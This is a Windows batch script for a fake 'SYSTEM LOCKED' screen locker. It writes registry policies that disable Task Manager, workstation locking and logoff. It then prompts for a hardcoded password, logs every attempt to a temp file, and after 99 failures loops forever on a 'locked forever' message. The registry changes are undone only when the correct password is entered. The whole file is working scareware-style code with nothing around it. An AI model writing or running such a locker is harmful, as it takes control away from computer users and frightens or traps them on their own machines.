@echo off
setlocal enabledelayedexpansion
title SYSTEM LOCKED
mode con: cols=100 lines=30
color 0C
cls

set "PASSWORD=0000"
set "ATTEMPTS=0"
set "MAX_ATTEMPTS=99"
set "LOG=%TEMP%\lock_log.txt"
echo === LOCKER STARTED %DATE% %TIME% === >> "%LOG%"

call :Banner
call :DisableKeys
call :Loop
goto :EOF

:Banner
cls
echo.
echo  ####################################################################################################
echo  #                                                                                                  #
echo  #     ███████╗██╗   ██╗███████╗████████╗███████╗███╗   ███╗    ██╗      ██████╗  ██████╗██╗  ██╗   #
echo  #     ██╔════╝╚██╗ ██╔╝██╔════╝╚══██╔══╝██╔════╝████╗ ████║    ██║     ██╔═══██╗██╔════╝██║ ██╔╝   #
echo  #     ███████╗ ╚████╔╝ ███████╗   ██║   █████╗  ██╔████╔██║    ██║     ██║   ██║██║     █████╔╝    #
echo  #     ╚════██║  ╚██╔╝  ╚════██║   ██║   ██╔══╝  ██║╚██╔╝██║    ██║     ██║   ██║██║     ██╔═██╗    #
echo  #     ███████║   ██║   ███████║   ██║   ███████╗██║ ╚═╝ ██║    ███████╗╚██████╔╝╚██████╗██║  ██╗   #
echo  #     ╚══════╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚═╝    ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝   #
echo  #                                                                                                  #
echo  ####################################################################################################
echo.
echo                                       YOUR COMPUTER HAS BEEN LOCKED
echo.
echo                                       Enter password to unlock
echo                                       Press Ctrl+C to force exit (may not work)
echo.
goto :EOF

:DisableKeys
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v NoLogoff /t REG_DWORD /d 1 /f >nul 2>&1
echo [%TIME%] Keys disabled >> "%LOG%"
goto :EOF

:RestoreKeys
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableLockWorkstation /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v NoLogoff /f >nul 2>&1
echo [%TIME%] Keys restored >> "%LOG%"
goto :EOF

:Loop
set /p "INPUT=  PASSWORD> "
set /a ATTEMPTS+=1
echo [%TIME%] Attempt !ATTEMPTS! input: !INPUT! >> "%LOG%"

if "!INPUT!"=="!PASSWORD!" goto :Success
if !ATTEMPTS! GEQ !MAX_ATTEMPTS! goto :TooMany

cls
call :Banner
echo.
echo   WRONG PASSWORD. Attempt !ATTEMPTS! of !MAX_ATTEMPTS!.
echo.
goto :Loop

:Success
cls
color 0A
echo.
echo   ##############################################
echo   #                                            #
echo   #          PASSWORD ACCEPTED                 #
echo   #          UNLOCKING SYSTEM...               #
echo   #                                            #
echo   ##############################################
echo.
echo [%TIME%] SUCCESS after !ATTEMPTS! attempts >> "%LOG%"
call :RestoreKeys
timeout /t 2 /nobreak >nul
exit

:TooMany
cls
color 0E
echo.
echo   TOO MANY ATTEMPTS. SYSTEM LOCKED FOREVER.
echo   Log saved to %LOG%
pause
goto :TooMany
